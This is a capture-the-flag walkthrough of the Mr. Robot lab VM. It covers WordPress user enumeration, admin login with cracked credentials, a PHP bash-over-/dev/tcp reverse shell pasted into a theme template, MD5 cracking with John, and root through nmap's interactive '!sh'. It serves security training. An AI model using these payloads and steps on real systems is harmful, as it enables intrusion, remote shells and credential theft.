# Mr. Robot CTF write-up

A narrative, reproducible walkthrough from foothold to root, with exact commands, sanity checks, and gotchas you’re likely to hit. Use this as a GitHub-ready reference.



#### Key setup commands
```bash
# Find your VPN IP (used for reverse shells)
ip addr show tun0 | sed -n 's/.*inet \([0-9.]\+\).*/\1/p'

# Quick connectivity check
ping -c 2 10.49.158.212
```



## Objectives and flags

- **Flag 1:** /key-1-of-3.txt
- **Flag 2:** /home/robot/key-2-of-3.txt
- **Flag 3:** /root/key-3-of-3.txt



## Initial enumeration

- **Goal:** Identify a web foothold and reachable admin surface.
- **Approach:** Web scan and WordPress enumeration.

#### Commands used
```bash
# Light scan to confirm web ports
nmap -sC -sV -Pn 10.49.158.212

# WordPress enumeration
wpscan --url http://10.49.158.212 --enumerate u
```

#### Findings
- **WordPress present:** Default theme Twenty Fifteen.
- **Users discovered:** `elliot`.
- **Credentials cracked:** `elliot:ER28-0652`.
  - **Label:** Valid combinations found with targeted wordlist.



## WordPress admin foothold

- **Goal:** Log in and access theme editor for code execution.
- **Login URL:** `http://10.49.158.212/wp-login.php`
- **Credentials:** `elliot / ER28-0652`

#### Actions
- **Navigation:** Appearance → Theme File Editor.
- **Writable templates:** `index.php` or `404.php` in Twenty Fifteen.

#### Gotcha
- **Label:** You may not see exact code snippets I referenced earlier. That’s okay—replace the entire file content with the payload.

---

## Reverse shell via theme editor

- **Goal:** Gain a shell as the web process user.
- **Method:** Replace template content with a minimal bash-over-TCP reverse shell.

#### Payload to paste
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_VPN_IP/YOUR_PORT 0>&1'");
?>
```

#### Steps
1. **Open:** Appearance → Theme File Editor → pick `404.php` or `index.php`.
2. **Replace:** Select all, delete, paste payload.
3. **Edit:** Set `YOUR_VPN_IP` (from `tun0`) and `YOUR_PORT` (e.g., 4444).
4. **Save:** Update file; look for “file edited successfully”.

#### Listener and trigger
```bash
# On attacker
nc -lvnp 4444

# In browser (to execute the payload)
http://10.49.158.212/wp-content/themes/twentyfifteen/404.php
# or
http://10.49.158.212/wp-content/themes/twentyfifteen/index.php
```

#### Expected output
- **Label:** Netcat shows connection from target.
- **Label:** Shell banner may include “cannot set terminal process group” and “no job control”—normal for raw shells.



## Stabilize and explore the shell

- **Goal:** Make the shell more interactive; confirm user and paths.

#### Shell upgrade
```bash
# Try Python pty
python -c 'import pty; pty.spawn("/bin/bash")'

# Then background nc, fix tty, and foreground
^Z
stty raw -echo
fg
```

#### Checks
```bash
whoami            # often 'daemon' on this VM
pwd
ls -la /home
ls -la /home/robot/
```

#### Findings
- **Label:** `/home/robot/key-2-of-3.txt` (readable only by `robot`).
- **Label:** `/home/robot/password.raw-md5` (MD5 hash of robot’s password).



## Pivot to robot: hash cracking

- **Goal:** Become `robot` to read Flag 2.

#### Extract the hash
```bash
cat /home/robot/password.raw-md5
# Example output:
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

#### Create a local hash file
```bash
# On attacker box (copy the line above)
nano robot.hash
# Paste: robot:c3fcd3d76192e4007dfb496cca67e13b
```

#### Crack with John
```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt robot.hash
john --show --format=Raw-MD5 robot.hash
# Expected: robot:abcdefghijklmnopqrstuvwxyz
```

#### Switch user and read Flag 2
```bash
su robot
# Password: abcdefghijklmnopqrstuvwxyz

cat /home/robot/key-2-of-3.txt
```



## Root privilege escalation via nmap interactive

- **Goal:** Read Flag 3 in `/root/`.
- **Context:** `robot` does not have sudo; instead, exploit nmap’s interactive mode.

#### Confirm nmap and path
```bash
which nmap
nmap --version
```

#### Launch interactive nmap
```bash
nmap --interactive
# You get an 'nmap>' prompt
```

#### Escape to shell
```text
nmap> !sh
# You should drop to a root shell: '#'
```

#### Grab Flag 3
```bash
id
cat /root/key-3-of-3.txt
```

#### Notes
- **Label:** The `!` bang runs shell commands within nmap’s interactive environment.
- **Label:** On this box, interactive nmap yields a root shell due to how it’s installed/configured.




## Flag summary

- **Flag 1:** Found at `/key-1-of-3.txt` as initial web enumeration prize.
- **Flag 2:** Read as `robot` after cracking MD5 and `su robot`.
- **Flag 3:** Read as `root` after escaping nmap interactive with `!sh`.




## Troubleshooting and common gotchas


- **Reverse shell not connecting:**
  - **Listener:** Ensure `nc -lvnp PORT` is running.
  - **IP mismatch:** Use your `tun0` IP, not public/ethernet IP.
  - **Firewall:** Try a different port (e.g., 443 or 8080).

- **Shell is unresponsive:**
  - **PTY:** Use `python -c 'import pty; pty.spawn("/bin/bash")'`.
  - **TTY fix:** `^Z`, then `stty raw -echo; fg`.

- **Cannot write in theme editor:**
  - **File choice:** Switch to another template (`404.php`, `index.php`).
  - **Persist:** If editor blocks saving, try another writable template or the plugin editor.

- **John detects wrong hash type (LM warnings):**
  - **Force format:** `--format=Raw-MD5` or `--format=dynamic=md5($p)`.

- **`sudo -l` denies robot:**
  - **Alternative:** Use `nmap --interactive` → `!sh` instead of sudo paths.



## Reproducible command log


```bash
# Enumeration
nmap -sC -sV -Pn 10.49.158.212
wpscan --url http://10.49.158.212 --enumerate u
# Valid creds discovered: elliot:ER28-0652

# Login and reverse shell (via theme editor)
# Paste payload in index.php or 404.php
# Listener:
nc -lvnp 4444
# Trigger payload:
curl http://10.49.158.212/wp-content/themes/twentyfifteen/404.php

# Shell stabilization
python -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo
fg

# Robot pivot
cat /home/robot/password.raw-md5
# Create local file and crack
nano robot.hash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt robot.hash
john --show --format=Raw-MD5 robot.hash
su robot
cat /home/robot/key-2-of-3.txt

# Root via nmap
which nmap
nmap --version
nmap --interactive
# at 'nmap>' prompt:
!sh
cat /root/key-3-of-3.txt
```

---

## Lessons learned

- **Foothold via CMS:** WordPress admin access often leads to RCE through theme/plugin editors.
- **Minimal payloads:** A one-liner bash TCP reverse shell is reliable and fast to deploy.
- **Shell hygiene:** Stabilizing TTY improves reliability for subsequent actions.
- **Hash awareness:** Force correct hash formats in John to avoid misclassification.
- **Privilege escalation mindset:** When sudo fails, look for interactive or setuid binaries (classic: nmap’s interactive mode).
- **Documentation discipline:** Save commands, outputs, and reasoning—turn wins into future playbooks.
